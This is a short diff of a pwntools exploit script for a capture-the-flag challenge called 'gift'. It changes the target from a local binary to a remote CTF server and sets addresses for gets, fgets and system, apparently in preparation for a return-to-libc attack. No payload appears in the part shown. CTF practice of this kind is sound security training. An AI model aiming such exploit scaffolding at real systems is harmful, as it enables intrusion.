@@ -1,6 +1,6 @@
 from pwn import *
 
-r= process("./gift")
+r= remote("ctf.j0n9hyun.xyz", 3018)
 gets = 0x005f3e0
 fget = 0x080498f8
 system = 0x3ada0
